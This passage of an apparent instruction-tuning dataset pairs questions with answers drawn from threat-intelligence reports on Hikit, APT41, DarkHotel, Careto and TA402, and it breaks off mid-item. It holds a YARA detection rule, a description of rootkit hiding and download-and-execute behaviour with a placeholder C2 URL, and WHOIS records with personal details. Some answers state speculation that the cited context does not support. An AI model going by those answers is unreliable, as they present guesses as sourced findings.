    "instruction": "Context: Medium Headline: Gen 2 Driver\nThe Gen 2 sub-family, beginning with Gen 2.0 Beta, employs a Windows device driver (\"the Driver\") to hide aspects of the DLL's functionality from normal system processes. The Driver is a relatively straightforward piece of software. It does not attempt to obfuscate its functionality from static analysis and it hooks a minimum number of kernel API functions in order to hide different pieces of information. The Driver is based primarily on the open source Agony rootkit2 and it has evidence of some portions of the code coming directly from a Chinese blog3 .\nThe Driver expose an IOCTL interface that supports the following OIDs:\nThe Driver is capable of hiding processes (by PID, not name), system modules, services, network connections, listening ports, directories (and by extension, files), as well as registry keys and values. In order to hide these items, the Driver hooks various Windows Kernel API calls. The following table maps the items the Driver can hide to the API function that the Driver hooks:\n1 James Antognini and Thomas F. Divine. \"Extending\t\n  the\t\n  Microsoft PassThru NDIS\t\n  Intermediate\t\n  Driver\u2014Parts: Two IP\t\n  Address Blocking NDIS IM Drivers\". December 15, 2003\n2 pudn. \"Agony Rootkit code, the stability and\t\n  can\t\n  be useful Driver Develop\". http://en.pudn.com/downloads74/sourcecode/windows/vxd/detail265112_en.html.\t\n  8 April\t\n  2007.\n3 CardMagic. \"[Reserved] NSI Module Hook: Hiding Port Under Windows Vista\". http://forum.eviloctal.com/archiver/tid-\u00ad\u201029604.html.\t\n \u00a08 July 2007.\nIn order to hide services, the Driver will access the memory of the services.exe process, locate the linked list of services and remove the service entry that the Driver wishes to hide. This is a surprisingly invasive method to obfuscate a process.\nUpon activation, the Driver will expose its interface by calling IoCreateDevice with the name \\Device\\agony (for Gen 2.0 Beta samples), \\Device\\HTTPS (for Gen 2.1 samples),\n\\Device\\advcachemgr (for Gen 2.2 samples) or \\Device\\diskdump (for Gen 2.3 samples). The Driver also creates a symbolic link to the device using the same name but under the \\DosDevices\\ tree.\nFor reasons unknown, the authors of the Driver used code from a Chinese blog that details how to hide network connections on Windows Vista and later decided to keep the example IP address within the code.\nMedium Headline: Command: connect\nThe connect function provides the functionality to allow one Hikit DLL to interface with another DLL of a similar version. The use of this functionality can best be illustrated by considering the fact that the Gen 1 Driver requires an exposed network interface in order for an external attacker to access the Gen 1's RAT function. This would prohibit lateral movement within a victim's network as the bulk of any organization's network infrastructure is not directly exposed to the Internet. By using the connect command, an attacker can instruct the externally exposed Gen 1 DLL to route traffic to a Gen 1 DLL that is behind the firewall, effectively making the externally exposed Gen 1 DLL a local router for Hikit traffic.\nMedium Headline: Gen 1 Analysis\nAs noted previously in this report, the Gen 1 sub-family has several sub-generations but overall the functionality of the Gen 1 sub-family has remained constant. With the exception of Gen 1.0, the functionality of Gen 1 comes from the DLL component (Gen 1.0 uses a stand-alone executable to achieve the same results). The DLL operates as a service, requiring an attacker is install the DLL as a service at some point prior to activation. The DLL contains only two exports: DllEntryPoint and DllRegisterServer.\t\n  Ultimately, both exports generate a new thread of the same function (\"mainThread\"). The difference between the two exports is that DllRegisterServer can take an optional command line argument of the letter \"u\" which will instruct the main thread to uninstall the Gen 1 system from a victim's computer. If the uninstall argument exists, mainThread will simply remove the Driver from the victim's machine and terminate. The authors of Gen 1 used freely available source code found online for their removal function.4\n4 PCAUSA. \"Programmatically Installing NDIS\t\n  Protocol Drivers\" http://www.ndis.com/ndis-\u00ad\u2010general/ndisinstall/programinstall.htm.\t\n \u00a02 December 2013.\nWhen the DLL activates, either by a call to DllEntryPoint or by calling DllRegisterServer without the u parameter, mainThread begins by verifying the version of the Driver installed on the victim's machine. This requires sending OID 0x12C850 to the Driver and comparing the resulting 32-bit value with the required driver version. If the version is incorrect (i.e. it doesn't match the specified version), the DLL installs the version of the Driver found within the DLL's resource section (under the BIN resource tree).\nWith the Driver version verified (or forcibly corrected by installing the appropriate Driver), the DLL will instruct the Driver to use a specified string (for Gen 1.0 and Gen 1.1 samples) or a DWORD (for Gen 1.2 samples) as the acknowledgment value to send to a connecting client who requests the appropriate URL. The DLL again checks the version of the Driver and, in some versions of the DLL, will print a message indicating the version of the Driver installed and report the \"Transate version\" (the word translate is misspelled within the binary). It appears that the Driver and the communication protocol version do not necessarily have to match exactly, allowing the possibility that the Driver and the DLL could be compiled at separate times. If the Driver version is less than the \"Transate\" version (indicating that the Driver is a version too old to support the necessary communication protocols), the DLL will, in some version of the DLL, print out a line to the screen indicating the DRIVER_MIN_VERSION required along with the current Driver version. Following this, the DLL will then attempt to install the correct version of the Driver prior to terminating. It is unclear why this code exists given that the DLL will check the Driver version and correct the Driver if necessary prior to reaching the portion of the code that reports the DRIVER_MIN_VERSION.\t\n  It is possible that the second Driver version check is a last ditch effort to ensure the correct Driver is installed.\nThe DLL enters an infinite loop where the DLL waits for the Driver to report a new channel exists. A channel represents an established connection between the Driver and an external party that has provided the proper initial request and, for Gen 1.2 variants, provided the proper authentication value. When the Driver establishes a new channel, the DLL generates a runtime data structure before generating a new thread (\"HikitThreadFunc\") which will service any request coming from the new channel. This allows the DLL to service multiple channels at one time.\nThe HikitThreadFunc function is, at its core, a simple wait and respond loop. The function begins by transmitting a Hikit command prompt to the client (Hikit>) before settling into an infinite loop of\n\u2022 Read data from channel (wait until data is available)\n\u2022 [For Gen 1.2] Decrypt the packet header\n\u2022 Verify the packet header to ensure the communication version is correct and the payload data size is non-zero\n\u2022 Read the remainder of the packet (e.g. the payload portion)\n\u2022 If the packet type field (dwPacketType) is zero, send the payload section to the command processor.\n\u2022 Send the Hikit prompt\nThe communication scheme between the DLL and the client consists of a 20 to 24 byte header (for Gen 1.0 and Gen 1.1) or a 28 byte header (for Gen 1.2) followed by an optional payload. The format of the Gen 1.0 and Gen 1.1 header is as follows:\nWhile the Gen 1.2 header is:\nstruct PacketHeader\n{\n};\nFor Gen 1.0 and Gen 1.1 samples, the magic field contains the string \".. ..\" (two dots followed by a space then two more dots). Whereas the key field in Gen 1.2 samples contains a 32-bit value that represents the XOR key for the remainder of the PacketHeader and any additional payload data. The XOR scheme works on 32-bit chunks of data where each 32-bit chunk of data is XOR'd against the key value.\nVersion checking is important in all Gen 1 variants. The dwHikitVersion field allows the client and the DLL to ensure that they have a compatible communication scheme in place prior to executing commands.\nGen 1 samples have a particular interest in the victim's locale language preferences. While it is typical for most RATs that provide remote shells to simply pass data unfiltered from client to server and server to client without regard to code pages, Gen 1 samples take special care to record the code page and locale information in each and every packet header that traverses the divide between client and server and server and client. This could indicate that the authors of Gen 1 understood from an early stage in the development of Gen 1 that they would be attacking computer systems with different locales and code pages.\nAnswer this question: Describe the initialization process of the Gen 1 DLL in the Hikit malware, including how it handles version verification and driver installation.",
    "output": "The Gen 1 DLL in the Hikit malware operates as a service and contains two exports: DllEntryPoint and DllRegisterServer. Both exports generate a new thread of the same function ('mainThread'). The difference is that DllRegisterServer can take an optional command line argument 'u' to uninstall the Gen 1 system. Upon activation, mainThread verifies the version of the Driver installed on the victim's machine by sending OID 0x12C850 to the Driver and comparing the resulting 32-bit value with the required driver version. If the version is incorrect, the DLL installs the correct version from its resource section. After verifying the Driver version, the DLL instructs the Driver to use a specified string or DWORD as the acknowledgment value for connecting clients. The DLL then enters an infinite loop waiting for the Driver to report a new channel, which represents an established connection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Home and enterprise threats\nThe usage patterns of home users and enterprise users tend to be very different. Enterprise users typically use computers to perform business functions while connected to a network, and may have limitations placed on their Internet and email usage. Home users are more likely to connect to the Internet directly or through a home router and to use their computers for entertainment purposes, such as playing games, watching videos, shopping, and communicating with friends. These different usage patterns mean that home users tend to be exposed to a different mix of computer threats than enterprise users.\nThe infection telemetry data produced by Microsoft antimalware products and tools includes information about whether the infected computer belongs to an Active Directory Domain Services (AD DS) domain. Such domains are used almost exclusively in enterprise environments, and computers that do not belong to a domain are more likely to be used at home or in other non-enterprise contexts. Comparing the threats encountered by domain-joined computers and non-domain computers can provide insights into the different ways attackers target enterprise and home users and which threats are more likely to succeed in each environment.\nFigure 61. Malware encounter rates for domain-based and non-domain computers, 3Q14\u20132Q15\nFigure 62. Malware and unwanted software encounter rates for domain-based and non-domain computers, 1H15, by category\n\uf0b7 Enterprise environments typically implement defense-in-depth measures, such as enterprise firewalls, that prevent a certain amount of malware from reaching users' computers. Consequently, enterprise computers tend to\nencounter malware at a lower rate than consumer computers. As (<>)Figure 61 shows, the encounter rate for consumer computers was about 2.5 times as high as the rate for enterprise computers in 1H15.\nEnterprise computers tend to encounter malware at a lower rate than consumer computers.\n\uf0b7 In addition to encountering less malware in general, computers in enterprise environments tend to encounter different kinds of threats than consumer computers, as shown in (<>)Figure 62. Non-domain computers encountered disproportionate amounts of unwanted software compared to domain-based computers, with Adware, Browser Modifiers, and Software Bundlers each appearing between three and six times as often on non-domain computers. Meanwhile, domain-based computers encountered Password Stealers & Monitoring Tools malware nearly as often as their non-domain counterparts, despite encountering less than half as much malware as non-domain computers overall.\n\uf0b7 One password stealer in particular, (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/Dyzap>)Win32/Dyzap, was encountered by domain-based computers more than four times as often as non-domain computers (an encounter rate of 0.12 percent on domain-based computers, compared to 0.03 percent on non-domain computers.) Dyzap steals login credentials for a long list of banking websites using man-in-the-browser (MITB) attacks. It is usually installed on the infected computer by the downloader family (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/Upatre>)Win32/Upatre, which is typically delivered via social engineering techniques that target enterprise audiences (for example, spam messages that mimic business faxes or overnight package delivery notifications).\nFigure 63. Quarterly trends for the top 10 malware and unwanted software families detected on domain-joined computers in 1H15, by percentage of computers encountering each family\nFigure 64. Quarterly trends for the top 10 malware and unwanted software families detected on non-domain computers in 1H15, by percentage of computers encountering each family\n\uf0b7 Six families\u2014(<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=INF/Autorun>)INF/Autorun, (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=JS/Axpergle>)JS/Axpergle, (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/CouponRuc>)Win32/CouponRuc, (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/KipodToolsCby>)Win32/KipodToolsCby, (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=VBS/Jenxcus>)VBS/Jenxcus, and (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/SaverExtension>)Win32/SaverExtension\u2014were common to both lists. All were more frequently encountered on non-domain computers than on domain-joined computers. See (<>)\"Threat families\" on page (<>)74 for more information about these families.\n\uf0b7 The four families that were unique to the top 10 list for domain-joined computers but not for non-domain computers are the worm family\n\uf0b7 Conficker is a worm that was disrupted several years ago, but continues to be encountered in domain environments because of its use of a built-in list of common and weak passwords to spread between computers.\n\uf0b7 AlterbookSP is a browser add-on that formerly displayed behaviors of unwanted software. Recent versions of the add-on no longer meet Microsoft detection criteria, and are no longer considered unwanted software.\n\uf0b7 Upatre installs malware and unwanted software on the affected computer without the user's consent. It is frequently distributed as an attachment to spam email messages. For more information about Upatre and how it spreads, see the following entries in the MMPC blog at blogs.technet.com/mmpc:\nConficker was disrupted several years ago, but continues to be encountered in domain environments because of its use of a built-in list of common and weak passwords to spread between computers.\n\uf0b7 \uf0b7 See (<>)\"Malware at Microsoft: Dealing with threats in the Microsoft environment\" on page (<>)110 for information about the threat landscape on computers at Microsoft and to learn about the actions Microsoft IT takes to protect users, data, and resources.\nQuestion: How does the distribution of malware and unwanted software differ between domain-based and non-domain computers, and what are some of the most common threats encountered in each environment?",
    "output": "Answer: Non-domain computers encounter disproportionately higher amounts of unwanted software compared to domain-based computers. Adware, Browser Modifiers, and Software Bundlers appear between three and six times as often on non-domain computers. Meanwhile, domain-based computers encounter Password Stealers & Monitoring Tools malware nearly as often as non-domain computers, despite encountering less than half as much malware overall. Some of the most common threats encountered in both environments include INF/Autorun, JS/Axpergle, Win32/CouponRuc, Win32/KipodToolsCby, VBS/Jenxcus, and Win32/SaverExtension, all of which are more frequently encountered on non-domain computers. Unique to domain-joined computers are threats like Conficker, AlterbookSP, and Upatre.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Third-Party Access\nIn multiple instances, APT41 targeted third parties and leveraged this access to target additional victims. APT41's exploitation of third parties varied. In some instances, APT41 moved laterally from one victim environment to another in order to initiate compromise. APT41 has also used credentials compromised in previous operations.\n\u2022 In 2014, APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service. The payment service was likely targeted because it provided access to multiple gaming companies.\n\u2022 Although we do not have first-hand evidence of APT41's compromise of TeamViewer, we have observed APT41 use compromised TeamViewer credentials as an entry point at multiple organizations.\n\u2013 During a 2017 compromise, APT41 initiated a TeamViewer session and transferred files that were later deleted. Filenames and creation times indicate that these may have been the HIGHNOON backdoor.\n\u2013 According to (<https://securityaffairs.co/wordpress/85733/hacking/teamviewer-2016-hack.html>)statements by a TeamViewer's spokesperson, the company was targeted in fall 2016. The company stated that they conducted a comprehensive security audit of its IT architecture and added additional security measures to help strengthen its security posture.\nBig Headline: History of Supply Chain Compromises\nSupply chain compromises are most likely an extension of APT41's tactics used in gaining access to gaming development environments and to other gaming organizations via third-party service providers. Public reports of supply chain compromises linked to APT41 date back to at least 2014, and technical evidence associated with these incidents was used to determine a relationship, if any, with APT41. Our assessment in each of these cases is noted in Table 1.\n\u2022 As demonstrated in operations targeting the video game industry, APT41 leverages a variety of TTPs to access production environments where they can inject malicious code into legitimate files. The files are signed with valid code-signing certificates and distributed widely to end users.\n\u2022 Supply chain targeting requires more effort than typically observed mass targeting methods, such as establishing a strategic web compromise (SWC) or conducting large spear-phishing campaigns.\nAlthough APT41 supply chain compromises affect very large numbers of victims, the group limits follow-on activity to select victims most likely to reduce detection and ensure any additional malware is delivered only to intended victims. Counterintuitively, supply chain operations add an additional layer of obscurity to the group's operations because it is difficult to pinpoint the desired target set.\n\u2022 In a June 2018 supply chain compromise, APT41 leveraged MAC addresses and C:\\ drive volume serial numbers to identify specifically targeted victims for follow-on activity. This significantly obfuscates the targeted sector or victim set; in a typical spear-phishing campaign, for example, desired targeting can be discerned based on recipients' email addresses.\nTable 1. Supply chain compromises.\nMedium Headline: December 2014\nIn December 2014, installers for three online games published by a Southeast Asian video game distributor were injected with the SOGU backdoor. The installer for these popular games was replaced by a malicious file that dropped the SOGU backdoor along with the normal game installer.\n\u2022 The video game distributor operates servers in East and Southeast Asia for some of the most popular online games, including the three games that were compromised: Path of Exile, League of Legends, and FIFA Online 3 (Table 2).\nWe have observed many similarities between TTPs involved in this compromise and APT41, including:\n\u2022 Targeting the same victim organization 31 days apart\n\u2022 Use of code-signing certificates from the same video game-related issuer organizations\n\u2022 Use of the same malware families (HIGHNOON.BIN, HIGHNOON.LITE, EASYNIGHT, FRONTWHEEL)\n\u2022 Use of HIGHNOON.BIN samples with the same compile times\n\u2022 Overlap in domain resolution to the same IP netblock (61.38.186.0/24) during the same time frame in 2012\n\u2022 Video game-related supply chain targeting\nDespite these compelling overlaps, the actors responsible for this compromise leverage additional unique tools not observed with APT41 or any other Chinese espionage group, suggesting that they are either part of APT41 and maintain their own toolset, or a close affiliate of APT41 that shares both tools and taskings.\nMedium Headline: March 2017\nIn March 2017, suspected Chinese espionage operators targeted CCleaner, a utility that assists in the removal of unwanted files from a computer. (<https://blog.avast.com/update-ccleaner-attackers-entered-via-teamviewer>)According to the parent company, Avast, the infected CCleaner was downloaded by 2.27 million customers. While we have identified some overlaps between the CCleaner activity and APT41, we do not have enough information to attribute the CCleaner compromise to APT41 at this time.\n\u2022 Both APT41 and the actors in the CCleaner incident used TeamViewer during initial compromise. According to Avast, the actors used TeamViewer to compromise a developer workstation and used VBScript (x64.vbs) to drop a malicious payload.\n\u2022 The compromised CCleaner update (which we call DIRTCLEANER) is believed to download a second-stage loader (MD5: 748aa5fcfa2af451c76039faf6a8684d) that contains a 32-bit and 64-bit COLDJAVA DLL payload. The COLDJAVA payload contains shellcode that loads a variant of BLACKCOFFEE (Figure 8).\n\u2013 While COLDJAVA has been used by APT41, BLACKCOFFEE has been used by other Chinese cyber espionage groups, including (<https://www.fireeye.com/blog/threat-research/2015/05/hiding_in_plain_sigh.html>)APT17 and APT40. It is possible that COLDJAVA may also be shared between distinct cyber espionage operators.\n\u2022 Malware samples identified in the CCleaner incident included notable shared design decisions observed in APT41 malware, including the use of domain generation\nalgorithms (DGA) for C&C, use of dead drop resolvers ((<https://www2.fireeye.com/rs/fireye/images/APT17_Report.pdf>)DDR), and use of shellcode as primary payloads. However, FireEye malware analysis of the compromised CCleaner samples and associated COLDJAVA samples did not reveal shared code with the POISONPLUG and POISONPLUG.SHADOW malware samples used in similar supply chain incidents by APT41.\n\u2013 DIRTCLEANER uses DGA to generate new C&C domains each month. This is similar to first-stage malware used in the Netsarang compromise described below.\n\u2013 The BLACKCOFFEE sample reaches out to actor-controlled profiles hosted on legitimate websites to retrieve encoded commands for C&C, a technique known as DDR. The malware parses the content of the websites (listed in Table 3), looking for 12 bytes contained between the tags: \"BSM1cr0S0ft\" and \"SBM1cr0Soft.\" APT41 POISONPLUG samples have also used DDR for C&C.\n\u2013 The POISONPLUG and POISONPLUG.SHADOW samples in similar supply chain incidents use a shellcode format that resembles PE files, while the BLACKCOFFEE backdoor that was delivered in the CCleaner compromise uses a traditional PIC blob. Additionally, there is apparent code reuse between observed POISONPLUG and POISONPLUG samples not observed in the CCleaner samples.\nMedium Headline: July 2017\nIn July 2017, APT41 injected malicious code into a software update package maintained by Netsarang and signed it with a legitimate Netsarang certificate in an operation referred to as (<https://securelist.com/shadowpad-in-corporate-networks/81432/>)\"ShadowPad\" by Kaspersky. The software package is reportedly used by hundreds of companies worldwide.\n\u2022 We observed numerous opportunistic infections associated with POISONPLUG.SHADOW spanning 13 countries and a variety of industries, demonstrating the broad impact of this operation. However, we have not observed the associated second-stage at any victim organizations. Open-source reporting indicated one victim was identified in Hong Kong.\n\u2022 Signing the malicious update with a legitimate NetSarang certificate is consistent with APT41's pattern of using legitimate certificates. In this case, all updates were required to be signed by Netsarang, which means APT41 had to use the code-signing certificate to subvert the update mechanism.\n\u2013 Alternatively, it is also possible that APT41 injected malicious code into the package prior to compilation, circumventing the need to steal the code-signing certificate and compile it on their own.\n\u2022 The first stage of the malware uses DGA, which changes its C&C servers monthly. The use of shifting network infrastructure is most likely intended to add operational robustness and to reduce detection.\n\u2022 The second-stage shellcode is initialized only after it is activated using a decryption key retrieved from the first-stage DNS communications. This likely allows APT41 to selectively activate the payload on specific victim systems. The second-stage payload contains the default C&C server, notped.com, which overlaps with other APT41 C&C infrastructure. Other reported APT41 domains that may also be related to the second-stage payload can be found in Table 4.\nTable 4. Reported APT41 domains associated with POISONPLUG.SHADOW.\nDomain\nAssociated Malware Family\n\nWhat are the key characteristics of the March 2017 CCleaner compromise, and how do they relate to APT41's known activities?",
    "output": "In March 2017, suspected Chinese espionage operators targeted CCleaner, a utility that assists in the removal of unwanted files from a computer. The infected CCleaner was downloaded by 2.27 million customers. Both APT41 and the actors in the CCleaner incident used TeamViewer during the initial compromise. The compromised CCleaner update (DIRTCLEANER) downloaded a second-stage loader containing a 32-bit and 64-bit COLDJAVA DLL payload, which loaded a variant of BLACKCOFFEE. While COLDJAVA has been used by APT41, BLACKCOFFEE has been used by other Chinese cyber espionage groups, including APT17 and APT40. Malware samples in the CCleaner incident included shared design decisions observed in APT41 malware, such as the use of domain generation algorithms (DGA) for C&C, use of dead drop resolvers (DDR), and use of shellcode as primary payloads. However, FireEye malware analysis did not reveal shared code with the POISONPLUG and POISONPLUG.SHADOW malware samples used in similar supply chain incidents by APT41.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nThe DarkHotel threat actors have been known to operate for a decade now, targeting thousands of businesses across the world via Wi\u00adFi infrastructure in hotels. Blending whaling (high-level spear phishing) techniques with advanced malware and other complex attack avenues (such as digital certificate factoring), the threat actors have been able to run their business undisturbed for years, except for the few times when samples of DarkHotel malware is documented in blog posts by threat researchers.\nThis whitepaper covers such a sample of a particular DarkHotel attack, known as lnexsmar. The sample dates back to September 2016, but our malware zoo reveals that samples with a high degree of similitude have been around since 2011.\nUnlike any other known DarkHotel campaigns, the isolated sample uses a new payload delivery mechanism rather than the consacrated zero-day exploitation techniques. Instead, the new campaign blends social engineering with a relatively complex Trojan to infect its selected pool of victims.\nMoreover, while most known DarkHotel campaigns target corporate research and development personnel, CEOs and other senior corporate officials, this attack seems focused on politics rather than financial gains.\n\nWhy did the DarkHotel threat actors shift their focus from targeting corporate personnel to political targets in the Inexsmar attack? Additionally, how does this change in targeting reflect on their overall strategy and capabilities?",
    "output": "The DarkHotel threat actors shifted their focus from targeting corporate research and development personnel, CEOs, and other senior corporate officials to political targets in the Inexsmar attack. This change in targeting suggests a strategic pivot towards influencing geopolitical outcomes rather than pursuing financial gains. This shift reflects the group's versatility and adaptability, indicating that they possess the capability to tailor their operations to different objectives. By targeting political entities, DarkHotel demonstrates an advanced level of sophistication and a deep understanding of the potential impact of their actions on global affairs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: APPENDIX 3: C&C registration information\nMost of the Careto C&C hosts were registered through the free service DYN.COM. Some of the domains however are stand-alone .COM and .NET registration. The registration data is partly visible in a few cases:\nDomain Name: APPLEUPDT[dot]COM\nRegistrar WHOIS Server: whois.publicdomainregistry.com\nRegistrar URL: www.publicdomainregistry.com\nUpdated Date:\nCreation Date: 25-Feb-2009\nRegistrar Registration Expiration Date: 25-Feb-2019\nRegistrar: PDR Ltd. d/b/a PublicDomainRegistry.com\nRegistrar IANA ID: 303\nRegistrar Abuse Contact Email:\nRegistrar Abuse Contact Phone: +1-2013775952\nDomain Status: OK\nRegistry Registrant ID: DI_9419517\nVictoria Gomez\nRegistrant Name:\nRegistrant Organization: N/A\nRegistrant Street: CL Esmeralda No 1332\nRegistrant City: Buenos Aires\nRegistrant State/Province: Buenos Aires\nRegistrant Postal Code: C1007A\nRegistrant Country: AR\nRegistrant Phone: +541.141311903\nRegistrant Email:\nDomain Name: MSUPDT[dot]COM\nRegistry Domain ID: 1080338848_DOMAIN_COM-VRSN\nRegistrar WHOIS Server: whois.publicdomainregistry.com\nRegistrar URL: www.publicdomainregistry.com\nUpdated Date: 18-Jun-2013\nCreation Date: 11-Jul-2007\nRegistrar Registration Expiration Date: 11-Jul-2017\nRegistrar: PDR Ltd. d/b/a PublicDomainRegistry.com\nRegistrar IANA ID: 303\nRegistrar Abuse Contact Email:\nRegistrar Abuse Contact Phone: +1-2013775952\nDomain Status: clientTransferProhibited\nRegistry Registrant ID: DI_6819375\nAnne Rasmussen\nRegistrant Name:\nRegistrant Organization: msupdt.com\nRegistrant Street: Storgatan 21\nRegistrant City: Goteborg\nRegistrant State/Province:\nRegistrant Postal Code: 41296\nRegistrant Country: SE\nRegistrant Phone: +46.318831056\nRegistrant Phone Ext:\nRegistrant Fax: +46.318831056\nRegistrant Email:\nRegistry Admin ID: DI_6819375\nDomain Name: linkconf[dot]net\nRegistry Domain ID: 1710052877_DOMAIN_NET-VRSN\nRegistrar WHOIS Server: whois.gandi.net\nRegistrar URL: http://www.gandi.net\nUpdated Date: 2013-10-23T18:46:03Z\nCreation Date: 2012-03-30T12:12:52Z\nRegistrar Registration Expiration Date: 2017-03-30T12:12:52Z\nRegistrar: GANDI SAS\nRegistrar IANA ID: 81\nRegistrar Abuse Contact Email:\nRegistrar Abuse Contact Phone: +33.170377661\nDomain Status: clientTransferProhibited\nRegistry Registrant ID:\nJOAQUIM COSTA\nRegistrant Name:\nRegistrant Organization:\nRegistrant Street: Rua do Carmo 26\nRegistrant City: Braga\nRegistrant State/Province:\nRegistrant Postal Code: 4700-309\nRegistrant Country: PT\nRegistrant Phone: +351.253204804\nRegistrant Email:\n\nWhy did the attackers behind the 'Mask' APT campaign choose to register most of their C&C hosts through the free service DYN.COM, and what implications does this have for detecting and mitigating such threats?",
    "output": "A: The attackers chose to register most of their C&C hosts through the free service DYN.COM likely because it provides anonymity and ease of registration without requiring detailed personal or organizational information. This makes it harder for investigators to trace the origins of the domains. However, this practice also means that defenders can look for patterns in domain registrations and potentially identify malicious activity by monitoring DYN.COM and similar services. By understanding the registration practices of the attackers, cybersecurity experts can enhance their detection mechanisms to flag suspicious domain registrations and take proactive measures to mitigate potential threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Attribution\nProofpoint attributes the campaigns to TA402 based on both technical indicators and victimology. The observed attack chains mimic historical TA402 campaigns, some of which are discussed in Proofpoint's . The phishing campaigns share thematic elements with historical Molerats campaigns. For example, the December 2021 campaign contained a title bearing significant similarities to a 2015 TA402 campaign reported by (<https://securelist.com/gaza-cybergang-wheres-your-ir-team/72283/>)Kaspersky.\nThe campaigns observed by Proofpoint likely occurred concurrently to Zscaler's recently published  on Molerats activity targeting individuals in Palestine & Turkey and demonstrate Molerats continued ability to modify their attack chain based on their intelligence targets.\nThe significant technical connections between the DropBox accounts used by the LastConn malware, the account used to deploy NimbleMamba, and the account used to store intelligence exfiltrated by NimbleMamba indicate that LastConn and NimbleMamba are almost certainly deployed by the same operators. This was based on the findings found during the investigation performed by Dropbox Security Team, which neutralized all the associated accounts.\nTechnical intelligence, including (<https://team-cymru.com/blog/2022/01/26/analysis-of-a-management-ip-address-linked-to-molerats-apt/>)analysis of Molerats network activity from TeamCymru, indicates NimbleMamba developers operate in the interest of the Palestinian Territories. The guardrails employed by NimbleMamba demonstrate a clear focus on targeting Arabic speakers along with computers in the Middle East. Proofpoint observed campaigns targeting Middle Eastern governments, foreign policy think tanks, and a state-affiliated airline. Proofpoint assesses TA402 likely operates in support of Palestinian objectives, which is consistent with prior Proofpoint and the broader industry's previously published assessments.\nMedium Headline: YARA Signatures\nrule Proofpoint_Molerats_TA402_NimbleMamba {\nmeta:\ndescription = \"Detects .NET written NimbleMamba malware used by TA402/Molereats\"         author = \"Proofpoint Threat Research\"\ndisclaimer = \"Yara signature created for hunting purposes - not quality controlled within enterprise environment\"\nhash1 = \"430c12393a1714e3f5087e1338a3e3846ab62b18d816cc4916749a935f8dab44\"         hash2 = \"c61fcd8bed15414529959e8b5484b2c559ac597143c1775b1cec7d493a40369d\"\nstrings:\n$dotnet = \"#Strings\" ascii\n$dropbox = \"dropboxapi.com\" ascii wide\n$justpaste = \"justpaste.it\" wide\n$ip_1 = \"api.ipstack.com\" wide\n$ip_2 = \"myexternalip.com\" wide\n$ip_3 = \"ip-api.com\" wide\n$ip_4 = \"api.ipify.com\" wide\n$vm_1 = \"VMware|VIRTUAL|A M I|Xen\" wide\n$vm_2 = \"Microsoft|VMWare|Virtual\" wide\ncondition:\nuint16be(0) == 0x4D5A and $dotnet and $dropbox and $justpaste and any of ($ip_*) and any of ($vm_*)\nSubscribe to the Proofpoint Blog\nSelect\n\nQ: What are the significant technical connections between the DropBox accounts used by LastConn malware and those used to deploy NimbleMamba, and how did the Dropbox Security Team's investigation contribute to this understanding?",
    "output": "A: The significant technical connections between the DropBox accounts used by the LastConn malware, the account used to deploy NimbleMamba, and the account used to store intelligence exfiltrated by NimbleMamba indicate that LastConn and NimbleMamba are almost certainly deployed by the same operators. This conclusion was based on the findings from the investigation performed by the Dropbox Security Team, which neutralized all the associated accounts. The shared use of DropBox accounts suggests a coordinated effort by the same group of actors, reinforcing the attribution to TA402.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: a) Download & Execute Functionality 1\nMalware triggers the download functionality by connecting to the C2 server and making a request to either Jobwork1.php or Jobwork2.php, if the C2 response satisfies the condition then it downloads & executes the file. After understanding the logic (logic is mentioned below) & to satisfy the condition the environment was configured to give proper response whenever the malware made a request to Jobwork1.php or Jobwork2.php. Below screen shot shows the response given to the malware.\nMalware then reads the response successfully as shown in the below screen shot.\nfrom the C2 response it extracts two things a) URL to download an executable file and b) the command string that will trigger the download functionality\nFrom the C2 response the URL is extracted starting from offset 14 (i.e 15th character) and it determines the length of the string (URL) to extract by finding the start offset of the string \"clientpermission\" once it finds it, its offset value is subtracted with 17.\nThe command string to trigger the download functionality is extracted from the C2 response using the logic shown below. Below screen shot shows the logic used to extract the URL and the command strings, in the below screen shot the extracted command string is stored in the variable ServerTask1Permission.\nOnce the URL and command string is extracted, the malware compares the command string with the string \"Pending\", only if the command string matches with string \"Pending\" the download functionality is triggered.\nWhen all the above mentioned conditions are satisfied the malware downloads the executable from the URL extracted from the C2 response. Below screen shot shows the URL extracted from the C2 response.\nNote: In the below screen shot the URL (hxxp://c2xy.com/a.exe) is not the actual URL used by the malware for downloading the file, this is a test URL used to determine the functionality, so this URL should not used as an indicator.\nBelow screen shot shows the network traffic of malware trying to download the executable file from the extracted URL.\nThe downloaded executable is saved in the %AppData%\\SQLite directory as shown in the below screen shot.\nThe downloaded file is then executed by the malware as shown in the below screen shot.\nOnce the downloaded file is executed the malware reports that the download & execute was successful by making a POST request to JobDone.php as shown in the below screen shots\nThis functionality allows the attacker to change their hosting site (from where the malware will be downloaded), this can be achieved by changing the C2 response containing different URL.\nSmall Headline: b) Download & Execute Functionality 2\nMalware also supports second type of download functionality,instead of extracting the URL from the C2 response and downloading the executable, it gets executable content from the networks stream from a hard coded IP address and then writes it to the disk and executes it.\nThis functionality is triggered by making a request to either JobTcp1.php or JobTcp2.php, if the C2 response satisfies the condition then it gets the executable content from a hard coded IP address. After understanding the logic & to satisfy the condition the environment was configured to give proper response when the malware made a request to JobTcp1.php or JobTcp2.php. Below screen shot shows the response given to the malware.\nMalware then reads the c2 response and from the C2 response it extracts two things a) filename and b) the command string that will trigger the download functionality.\nFrom the C2 response the filename is 